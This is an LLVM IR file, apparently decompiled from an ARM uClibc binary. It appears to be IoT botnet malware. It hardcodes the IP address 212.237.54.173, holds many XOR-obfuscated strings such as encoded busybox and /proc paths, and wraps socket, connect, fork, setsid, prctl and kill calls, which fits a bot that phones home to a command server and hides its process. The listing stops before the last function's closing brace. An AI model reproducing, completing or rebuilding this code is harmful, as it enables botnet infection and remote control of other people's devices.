source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%_TYPEDEF_fd_set = type { [1 x i32] }
%timeval = type { i32, i32 }
%dirent = type { i32, i32, i16, i8, [256 x i8] }
%__dirstream = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1a508.2 = global i32 1
@global_var_1a5a0.3 = global i32* @global_var_1a508.2
@global_var_1a5a8.4 = global i32 0
@global_var_1a5ac.5 = global i32 35684
@global_var_1a5b0.6 = global i32 35684
@global_var_1a5b4.7 = global i32 35684
@global_var_1a5b8.8 = global i32 35684
@global_var_1a5bc.9 = global i32 35684
@global_var_1a5c0.10 = global i32 35684
@global_var_1a5c4.11 = global i32 35684
@global_var_1a5c8.12 = global i32 35684
@global_var_1a5cc.13 = global i32 35684
@global_var_1a5d0.14 = global i32 35684
@global_var_1a5d4.15 = global i32 35684
@global_var_1a5d8.16 = global i32 35684
@global_var_1a5dc.17 = global i32 35684
@global_var_1a5e0.18 = global i32 35684
@global_var_1a5e4.19 = global i32 35684
@global_var_1a5e8.20 = global i32 35684
@global_var_1a5ec.21 = global i32 35684
@global_var_1a5f0.22 = global i32 35684
@global_var_1a5f8.24 = global i32 35684
@global_var_1a5fc.25 = global i32 35684
@global_var_1a600.26 = global i32 35684
@global_var_1a604.27 = global i32 35684
@global_var_1a608.28 = global i32 35684
@global_var_1a60c.29 = global i32 35684
@global_var_1a610.30 = global i32 35684
@global_var_1a614.31 = global i32 35684
@global_var_1a618.32 = global i32 35684
@global_var_1a61c.33 = global i32 35684
@global_var_1a620.34 = global i32 35684
@global_var_1a624.35 = global i32 35684
@global_var_1a628.36 = global i32 35684
@global_var_1a62c.37 = global i32 35684
@global_var_1a630.38 = global i32 35684
@global_var_1a634.39 = global i32 35684
@global_var_1a638.40 = global i32 35684
@global_var_1a63c.41 = global i32 35684
@global_var_1a640.42 = global i32 35684
@global_var_1a644.43 = global i32 35684
@global_var_1a648.44 = global i32 35684
@global_var_1a650.46 = global i32 35684
@global_var_1a654.47 = global i32 35684
@global_var_1a658.48 = global i32 35684
@global_var_1a65c.49 = global i32 35684
@global_var_1a660.50 = global i32 35684
@global_var_1a664.51 = global i32 35684
@global_var_1a668.52 = global i32 35684
@global_var_1a66c.53 = global i32 35684
@global_var_1a670.54 = global i32 35684
@global_var_1a674.55 = global i32 35684
@global_var_1a500.59 = global i32 0
@global_var_1a680.60 = global i32* @global_var_1a500.59
@global_var_1a6a0.66 = global i32 0
@global_var_ef10.72 = constant i32 -382906384
@global_var_1a6bc.77 = global i32 0
@global_var_9040.78 = constant i32 -352321546
@global_var_8db8.79 = constant i32 -493894144
@global_var_d1b0.85 = constant i32 -382906384
@global_var_d674.87 = constant i32 -382906384
@global_var_c83c.89 = constant i32 -382906384
@global_var_c0f0.91 = constant i32 -382906384
@global_var_b97c.93 = constant i32 -382906384
@global_var_b100.95 = constant i32 -382906384
@global_var_9e80.98 = constant i32 -382906384
@global_var_9704.100 = constant i32 -382906384
@global_var_a59c.102 = constant i32 -382906384
@global_var_1a714.104 = global i32 0
@global_var_1a71c.116 = global i32 0
@global_var_1226c.118 = constant i32 47
@global_var_c700.120 = constant i32 -443744140
@global_var_1a6c0.124 = global i32 0
@global_var_edd0.126 = constant i32 -382910448
@global_var_1a690.128 = global i32 72852
@global_var_1a688.130 = global i32 -1
@global_var_12270.135 = constant [15 x i8] c"212.237.54.173\00"
@global_var_1a724.138 = local_unnamed_addr global i32 0
@global_var_1a723.139 = local_unnamed_addr global i32 0
@global_var_1a722.140 = local_unnamed_addr global i32 0
@global_var_1a6c4.142 = global i32 0
@global_var_1a721.148 = local_unnamed_addr global i32 0
@global_var_12280.152 = constant i32 10
@global_var_1a68c.154 = global i32 -1
@global_var_8dac.158 = constant i32 -493894144
@global_var_11c94.159 = constant i32 -382910224
@global_var_12284.162 = constant i32 16777216
@global_var_1a6cc.164 = global i32 0
@global_var_1a6d8.166 = global i32 0
@global_var_1a6d0.168 = global i32 0
@global_var_1a6d4.170 = global i32 0
@global_var_1a710.184 = global i32 0
@global_var_1a6dc.186 = global i32 0
@global_var_1a708.188 = global i32 0
@global_var_1a738.193 = global i32 0
@global_var_1a730.197 = global i32 0
@global_var_1a734.199 = global i32 0
@global_var_1a6e0.201 = global i32 0
@global_var_1a6e3.202 = local_unnamed_addr global i32 0
@global_var_1a6e2.203 = local_unnamed_addr global i32 0
@global_var_1a6f4.205 = global i32 0
@global_var_1a6e5.207 = local_unnamed_addr global i32 0
@global_var_1a6e9.208 = local_unnamed_addr global i32 0
@global_var_1a6e8.209 = local_unnamed_addr global i32 0
@global_var_1a6f7.210 = local_unnamed_addr global i32 0
@global_var_1a6f5.211 = local_unnamed_addr global i32 0
@global_var_1a6e4.212 = local_unnamed_addr global i32 0
@global_var_1a6f6.213 = local_unnamed_addr global i32 0
@global_var_1a703.215 = local_unnamed_addr global i32 0
@global_var_1a702.216 = local_unnamed_addr global i32 0
@global_var_12310.218 = constant [5 x i8] c"&;; \00"
@global_var_12314.220 = constant i32 536542976
@global_var_1228c.222 = constant [5 x i8] c"5:?;\00"
@global_var_12294.224 = constant [9 x i8] c"<!: acam\00"
@global_var_122a0.226 = constant [7 x i8] c" 18:1 \00"
@global_var_122a8.228 = constant [8 x i8] c"0125!8 \00"
@global_var_122b0.230 = constant [9 x i8] c"$5''#;&0\00"
@global_var_122bc.232 = constant [6 x i8] c"509=:\00"
@global_var_122c4.234 = constant [6 x i8] c"\22=.,\22\00"
@global_var_122cc.236 = constant [8 x i8] c"'!$$;& \00"
@global_var_122d4.238 = constant i32 423502179
@global_var_122e4.240 = constant [6 x i8] c"efg`a\00"
@global_var_122ec.242 = constant [5 x i8] c"!'1&\00"
@global_var_122f4.244 = constant i32 943467547
@global_var_12300.246 = constant i32 322070023
@global_var_1a6ec.247 = local_unnamed_addr global i32 0
@global_var_1a6ea.249 = local_unnamed_addr global i32 0
@global_var_1a6eb.250 = local_unnamed_addr global i32 0
@global_var_1a704.252 = local_unnamed_addr global i32 0
@global_var_1a705.253 = local_unnamed_addr global i32 0
@global_var_1230c.259 = constant [3 x i8] c"\0D\0A\00"
@global_var_1231e.261 = constant i32 2096127
@global_var_12315.263 = constant i32 2095871
@global_var_1a740.266 = global i32 0
@global_var_1a698.269 = global i32 -555811921
@global_var_12324.274 = constant [3 x i8] c"Qm\00"
@global_var_1a748.275 = local_unnamed_addr global i32 0
@global_var_1a74c.276 = local_unnamed_addr global i32 0
@global_var_1a74d.277 = local_unnamed_addr global i32 0
@global_var_12328.279 = constant [14 x i8] c"0;'9-=$z78!6T\00"
@global_var_1a750.280 = local_unnamed_addr global i32 0
@global_var_1a754.281 = local_unnamed_addr global i32 0
@global_var_1a755.282 = local_unnamed_addr global i32 0
@global_var_1a758.283 = local_unnamed_addr global i32 0
@global_var_1a75c.284 = local_unnamed_addr global i32 0
@global_var_1a75d.285 = local_unnamed_addr global i32 0
@global_var_12338.287 = constant i32 59987
@global_var_1a760.288 = local_unnamed_addr global i32 0
@global_var_1a764.289 = local_unnamed_addr global i32 0
@global_var_1a765.290 = local_unnamed_addr global i32 0
@global_var_124b8.292 = constant i32 808465680
@global_var_1a76c.293 = local_unnamed_addr global i32 0
@global_var_1a768.294 = local_unnamed_addr global i32 0
@global_var_1a76d.295 = local_unnamed_addr global i32 0
@global_var_1233c.297 = constant [7 x i8] c"'<188T\00"
@global_var_1a770.298 = local_unnamed_addr global i32 0
@global_var_1a774.299 = local_unnamed_addr global i32 0
@global_var_1a775.300 = local_unnamed_addr global i32 0
@global_var_12344.302 = constant [8 x i8] c"1:5681T\00"
@global_var_1a778.303 = local_unnamed_addr global i32 0
@global_var_1a77c.304 = local_unnamed_addr global i32 0
@global_var_1a77d.305 = local_unnamed_addr global i32 0
@global_var_1234c.307 = constant [8 x i8] c"'-' 19T\00"
@global_var_1a780.308 = local_unnamed_addr global i32 0
@global_var_1a784.309 = local_unnamed_addr global i32 0
@global_var_1a785.310 = local_unnamed_addr global i32 0
@global_var_12354.312 = constant [4 x i8] c"'<T\00"
@global_var_1a78c.313 = local_unnamed_addr global i32 0
@global_var_1a788.314 = local_unnamed_addr global i32 0
@global_var_1a78d.315 = local_unnamed_addr global i32 0
@global_var_12358.317 = constant i32 977090171
@global_var_1a794.318 = local_unnamed_addr global i32 0
@global_var_1a790.319 = local_unnamed_addr global i32 0
@global_var_1a795.320 = local_unnamed_addr global i32 0
@global_var_1236c.322 = constant i32 470227742
@global_var_1a79c.323 = local_unnamed_addr global i32 0
@global_var_1a798.324 = local_unnamed_addr global i32 0
@global_var_1a79d.325 = local_unnamed_addr global i32 0
@global_var_12388.327 = constant [10 x i8] c":7;&&17 T\00"
@global_var_1a7a4.328 = local_unnamed_addr global i32 0
@global_var_1a7a0.329 = local_unnamed_addr global i32 0
@global_var_1a7a5.330 = local_unnamed_addr global i32 0
@global_var_12394.332 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_1a7a8.333 = local_unnamed_addr global i32 0
@global_var_1a7ac.334 = local_unnamed_addr global i32 0
@global_var_1a7ad.335 = local_unnamed_addr global i32 0
@global_var_123a8.337 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_1a7b4.338 = local_unnamed_addr global i32 0
@global_var_1a7b0.339 = local_unnamed_addr global i32 0
@global_var_1a7b5.340 = local_unnamed_addr global i32 0
@global_var_123c0.342 = constant [8 x i8] c"{$&;7{T\00"
@global_var_1a7b8.343 = local_unnamed_addr global i32 0
@global_var_1a7bc.344 = local_unnamed_addr global i32 0
@global_var_1a7bd.345 = local_unnamed_addr global i32 0
@global_var_123c8.347 = constant [6 x i8] c"{1,1T\00"
@global_var_1a7c4.348 = local_unnamed_addr global i32 0
@global_var_1a7c0.349 = local_unnamed_addr global i32 0
@global_var_1a7c5.350 = local_unnamed_addr global i32 0
@global_var_123d0.352 = constant [5 x i8] c"{20T\00"
@global_var_1a7cc.353 = local_unnamed_addr global i32 0
@global_var_1a7c8.354 = local_unnamed_addr global i32 0
@global_var_1a7cd.355 = local_unnamed_addr global i32 0
@global_var_123d8.357 = constant [7 x i8] c"{95$'T\00"
@global_var_1a7d0.358 = local_unnamed_addr global i32 0
@global_var_1a7d4.359 = local_unnamed_addr global i32 0
@global_var_1a7d5.360 = local_unnamed_addr global i32 0
@global_var_123e0.362 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_1a7d8.363 = local_unnamed_addr global i32 0
@global_var_1a7dc.364 = local_unnamed_addr global i32 0
@global_var_1a7dd.365 = local_unnamed_addr global i32 0
@global_var_123f0.367 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_1a840.368 = local_unnamed_addr global i32 0
@global_var_1a844.369 = local_unnamed_addr global i32 0
@global_var_1a845.370 = local_unnamed_addr global i32 0
@global_var_123fc.372 = constant [8 x i8] c"z5:=91T\00"
@global_var_1a848.373 = local_unnamed_addr global i32 0
@global_var_1a84c.374 = local_unnamed_addr global i32 0
@global_var_12404.376 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_1a7e0.377 = local_unnamed_addr global i32 0
@global_var_1a7e4.378 = local_unnamed_addr global i32 0
@global_var_1a7e5.379 = local_unnamed_addr global i32 0
@global_var_12418.381 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_1a7e8.382 = local_unnamed_addr global i32 0
@global_var_1a7ec.383 = local_unnamed_addr global i32 0
@global_var_1a7ed.384 = local_unnamed_addr global i32 0
@global_var_12430.386 = constant [9 x i8] c"5''#;&0T\00"
@global_var_1a7f0.387 = local_unnamed_addr global i32 0
@global_var_1a7f4.388 = local_unnamed_addr global i32 0
@global_var_1a7f5.389 = local_unnamed_addr global i32 0
@global_var_124d8.391 = constant i32 557516544
@global_var_1a7fc.392 = local_unnamed_addr global i32 0
@global_var_1a7f8.393 = local_unnamed_addr global i32 0
@global_var_1a7fd.394 = local_unnamed_addr global i32 0
@global_var_1243c.396 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_1a804.397 = local_unnamed_addr global i32 0
@global_var_1a800.398 = local_unnamed_addr global i32 0
@global_var_1a805.399 = local_unnamed_addr global i32 0
@global_var_12450.401 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_1a80c.402 = local_unnamed_addr global i32 0
@global_var_1a808.403 = local_unnamed_addr global i32 0
@global_var_1a80d.404 = local_unnamed_addr global i32 0
@global_var_12460.406 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_1a810.407 = local_unnamed_addr global i32 0
@global_var_1a814.408 = local_unnamed_addr global i32 0
@global_var_1a815.409 = local_unnamed_addr global i32 0
@global_var_12470.411 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_1a81c.412 = local_unnamed_addr global i32 0
@global_var_1a818.413 = local_unnamed_addr global i32 0
@global_var_1a81d.414 = local_unnamed_addr global i32 0
@global_var_12484.416 = constant [9 x i8] c"$662*7!E\00"
@global_var_1a820.417 = local_unnamed_addr global i32 0
@global_var_1a824.418 = local_unnamed_addr global i32 0
@global_var_1a825.419 = local_unnamed_addr global i32 0
@global_var_12490.421 = constant [6 x i8] c";3=:T\00"
@global_var_1a82c.422 = local_unnamed_addr global i32 0
@global_var_1a828.423 = local_unnamed_addr global i32 0
@global_var_1a82d.424 = local_unnamed_addr global i32 0
@global_var_12498.426 = constant [7 x i8] c"1: 1&T\00"
@global_var_1a830.427 = local_unnamed_addr global i32 0
@global_var_1a834.428 = local_unnamed_addr global i32 0
@global_var_1a835.429 = local_unnamed_addr global i32 0
@global_var_124a0.431 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_1a83d.432 = local_unnamed_addr global i32 0
@global_var_1a838.433 = local_unnamed_addr global i32 0
@global_var_1a83c.434 = local_unnamed_addr global i32 0
@global_var_1a4f8.436 = global i32 0
@global_var_1a4f4.437 = global i32 -1
@global_var_1a69c.57 = external global i8*
@global_var_1a6b8.75 = external global i8*
@global_var_1a6b9.83 = global i8 0
@global_var_1a718.122 = external global i8*
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1a694.132 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1a720.137 = global %sockaddr* null
@global_var_ec48.144 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1a6c8.157 = external global i8*
@global_var_1a70c.190 = external global i8*
@global_var_1a70d.191 = local_unnamed_addr global i8 0
@global_var_1a700.206 = local_unnamed_addr global i8 0
@global_var_1a701.214 = local_unnamed_addr global i8 0
@global_var_1a6f8.251 = local_unnamed_addr global i8 0
@global_var_1a6f0.248 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b4c() local_unnamed_addr {
entry:
  %v3_8b50 = load i32, i32* @r4, align 4
  %v0_8b58 = call i32 @function_8e5c()
  store i32 %v0_8b58, i32* @r0, align 4
  %v1_8b5c = call i32 @function_1221c(i32 %v0_8b58)
  call void @__pseudo_branch(i32 %v3_8b50)
  ret i32 %v1_8b5c
}

define i32 @function_8b64(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8b70 = load i32, i32* @global_var_1a5a8.4, align 4
  call void @__pseudo_branch(i32 %v3_8b70)
  %v0_8b74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b74, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v7_8b74 = load i32, i32* @r0, align 4
  ret i32 %v7_8b74

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i8* @_strcpy(i8* %dest, i8* %src) local_unnamed_addr {
entry:
  %v8_8b80 = call i8* @strcpy(i8* %dest, i8* %src)
  ret i8* %v8_8b80
}

define i32 @_ioctl(i32 %fd, i32 %request, ...) local_unnamed_addr {
entry:
  %v6_8b8c = call i32 (i32, i32, ...) @ioctl(i32 %fd, i32 %request)
  ret i32 %v6_8b8c
}

define i32 @_recv(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8b98 = call i32 @recv(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8b98
}

define i32 @_connect(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8ba4 = call i32 @connect(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8ba4
}

define i32 @_sigemptyset(%_TYPEDEF_sigset_t* %set) local_unnamed_addr {
entry:
  %v6_8bb0 = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %set)
  ret i32 %v6_8bb0
}

define i32* @_memmove(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8bbc = call i32* @memmove(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8bbc
}

define i32 @_getpid() local_unnamed_addr {
entry:
  %v4_8bc8 = call i32 @getpid()
  ret i32 %v4_8bc8
}

define i32 @_prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v9_8bd4 = call i32 @prctl(i32 %option, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  ret i32 %v9_8bd4
}

define i32* @_memcpy(i32* %dest, i32* %src, i32 %n) local_unnamed_addr {
entry:
  %v9_8be0 = call i32* @memcpy(i32* %dest, i32* %src, i32 %n)
  ret i32* %v9_8be0
}

define i32 @_readlink(i8* %path, i8* %buf, i32 %len) local_unnamed_addr {
entry:
  %v9_8bec = call i32 @readlink(i8* %path, i8* %buf, i32 %len)
  ret i32 %v9_8bec
}

define i32* @_malloc(i32 %size) local_unnamed_addr {
entry:
  %v5_8bf8 = call i32* @malloc(i32 %size)
  ret i32* %v5_8bf8
}

define i32 @_sleep(i32 %seconds) local_unnamed_addr {
entry:
  %v5_8c04 = call i32 @sleep(i32 %seconds)
  ret i32 %v5_8c04
}

define i32 @_recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v10_8c10 = call i32 @recvfrom(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v10_8c10
}

define i32 @_socket(i32 %domain, i32 %type, i32 %protocol) local_unnamed_addr {
entry:
  %v7_8c1c = call i32 @socket(i32 %domain, i32 %type, i32 %protocol)
  ret i32 %v7_8c1c
}

define i32 @_select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout) local_unnamed_addr {
entry:
  %v12_8c28 = call i32 @select(i32 %nfds, %_TYPEDEF_fd_set* %readfds, %_TYPEDEF_fd_set* %writefds, %_TYPEDEF_fd_set* %exceptfds, %timeval* %timeout)
  ret i32 %v12_8c28
}

define %dirent* @_readdir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8c34 = call %dirent* @readdir(%__dirstream* %dirp)
  ret %dirent* %v6_8c34
}

define i32 @_sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo) local_unnamed_addr {
entry:
  %v7_8c40 = call i32 @sigaddset(%_TYPEDEF_sigset_t* %set, i32 %signo)
  ret i32 %v7_8c40
}

define i32 @_send(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
entry:
  %v9_8c4c = call i32 @send(i32 %fd, i32* %buf, i32 %n, i32 %flags)
  ret i32 %v9_8c4c
}

; Function Attrs: noreturn
define void @_abort() local_unnamed_addr #0 {
entry:
  call void @abort()
  unreachable
}

define i32 @_accept(i32 %fd, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
entry:
  %v9_8c64 = call i32 @accept(i32 %fd, %sockaddr* %addr, i32* %addr_len)
  ret i32 %v9_8c64
}

define i32* @_calloc(i32 %nmemb, i32 %size) local_unnamed_addr {
entry:
  %v6_8c70 = call i32* @calloc(i32 %nmemb, i32 %size)
  ret i32* %v6_8c70
}

define i32 @_write(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
entry:
  %v8_8c7c = call i32 @write(i32 %fd, i32* %buf, i32 %n)
  ret i32 %v8_8c7c
}

define i32 @_kill(i32 %pid, i32 %sig) local_unnamed_addr {
entry:
  %v6_8c88 = call i32 @kill(i32 %pid, i32 %sig)
  ret i32 %v6_8c88
}

define i32 @_bind(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
entry:
  %v8_8c94 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len)
  ret i32 %v8_8c94
}

define i32 @_inet_addr(i8* %cp) local_unnamed_addr {
entry:
  %v6_8ca0 = call i32 @inet_addr(i8* %cp)
  ret i32 %v6_8ca0
}

define i32 @_setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen) local_unnamed_addr {
entry:
  %v10_8cac = call i32 @setsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32 %optlen)
  ret i32 %v10_8cac
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8cb8 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8cb8
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8cc4 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8cc4
}

define i32 @_unlink(i8* %name) local_unnamed_addr {
entry:
  %v6_8cd0 = call i32 @unlink(i8* %name)
  ret i32 %v6_8cd0
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8cdc = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8cdc
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
  %v7_8ce8 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8ce8
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8cf4 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8cf4
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8d00 = call i32 @fork()
  ret i32 %v4_8d00
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8d0c = call i32 @__uClibc_main()
  ret i32 %v4_8d0c
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8d18 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8d18
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8d24 = call i32 @getppid()
  ret i32 %v4_8d24
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8d30 = call i32 @time(i32* %timer)
  ret i32 %v6_8d30
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8d3c = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8d3c
}

define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8d48 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8d48
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d54 = call i32* @__errno_location()
  ret i32* %v4_8d54
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_atoi(i8* %nptr) local_unnamed_addr {
entry:
  %v6_8d6c = call i32 @atoi(i8* %nptr)
  ret i32 %v6_8d6c
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d78 = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d78
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8d84 = call i32 @clock()
  ret i32 %v4_8d84
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8d90 = call i32 @setsid()
  ret i32 %v4_8d90
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8d9c = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8d9c
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8da8 = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8da8
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8db4 = call i32 @close(i32 %fd)
  ret i32 %v5_8db4
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8dcc = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8dcc
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8dd8 = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8dd8
}

define i32 @function_8ddc() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8ddc = load i32, i32* @r4, align 4
  store i32 %v3_8ddc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1a69c.57 to i32), i32* %r5.global-to-local, align 4
  %v2_8de4 = load i8, i8* bitcast (i8** @global_var_1a69c.57 to i8*), align 4
  %v2_8de8 = icmp eq i8 %v2_8de4, 0
  br i1 %v2_8de8, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8dec = load i32, i32* @r0, align 4
  ret i32 %v12_8dec

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1a680.60 to i32), i32* %r4.global-to-local, align 4
  %v2_8df4 = load i32, i32* bitcast (i32** @global_var_1a680.60 to i32*), align 4
  store i32 %v2_8df4, i32* %r2.global-to-local, align 4
  %v2_8dfc = icmp eq i32 %v2_8df4, 0
  br i1 %v2_8dfc, label %bb8, label %dec_label_pc_8e04.preheader

dec_label_pc_8e04.preheader:                      ; preds = %bb7
  %v1_8e049 = add i32 %v2_8df4, 4
  store i32 %v1_8e049, i32* bitcast (i32** @global_var_1a680.60 to i32*), align 4
  call void @__pseudo_branch(i32 %v2_8df4)
  %v2_8e1411 = load i32, i32* bitcast (i32** @global_var_1a680.60 to i32*), align 4
  store i32 %v2_8e1411, i32* %r2.global-to-local, align 4
  %v2_8e1c12 = icmp eq i32 %v2_8e1411, 0
  br i1 %v2_8e1c12, label %.loopexit, label %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge

dec_label_pc_8e04.dec_label_pc_8e04_crit_edge:    ; preds = %dec_label_pc_8e04.preheader, %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge
  %v2_8e1413 = phi i32 [ %v2_8e14, %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge ], [ %v2_8e1411, %dec_label_pc_8e04.preheader ]
  %v1_8e08.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_8e04 = add i32 %v2_8e1413, 4
  %v2_8e08 = inttoptr i32 %v1_8e08.pre to i32*
  store i32 %v1_8e04, i32* %v2_8e08, align 4
  %v0_8e10 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8e10)
  %v2_8e14 = load i32, i32* bitcast (i32** @global_var_1a680.60 to i32*), align 4
  store i32 %v2_8e14, i32* %r2.global-to-local, align 4
  %v2_8e1c = icmp eq i32 %v2_8e14, 0
  br i1 %v2_8e1c, label %.loopexit, label %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge

.loopexit:                                        ; preds = %dec_label_pc_8e04.dec_label_pc_8e04_crit_edge, %dec_label_pc_8e04.preheader
  %v2_8e3c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8e3c = phi i32 [ %v2_8e3c.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1a69c.57 to i32), %bb7 ]
  %v3_8e3c = inttoptr i32 %v2_8e3c to i8*
  store i8 1, i8* %v3_8e3c, align 1
  %v2_8e40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8e40, i32* %r4.global-to-local, align 4
  %v11_8e40 = load i32, i32* @r0, align 4
  ret i32 %v11_8e40

; uselistorder directives
  uselistorder i32 %v2_8e14, { 1, 2, 0 }
